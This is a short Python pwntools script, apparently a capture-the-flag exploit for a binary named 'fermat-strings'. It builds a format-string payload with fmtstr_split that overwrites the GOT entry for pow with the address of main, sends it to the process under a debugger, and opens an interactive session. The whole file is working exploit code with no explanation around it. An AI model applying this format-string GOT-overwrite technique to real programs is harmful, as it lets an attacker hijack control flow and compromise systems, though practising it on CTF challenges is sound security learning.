from pwn import *
context.log_level = 'debug'
#r = process('./fermat-strings')
r = gdb.debug('./fermat-strings', 'b *0x4009d2 \n c')
e = ELF('./fermat-strings')
libc = ELF('./libc.so.6')
# %10$p for the start of our input
fmt, addr = fmtstr_split(10, {e.got['pow']: e.sym['main']}, numbwritten=8, badbytes=b'\x00')
payload = b'1'*8 + fmt
print(payload)
r.sendline(payload)
r.sendline(b'1')
r.interactive()
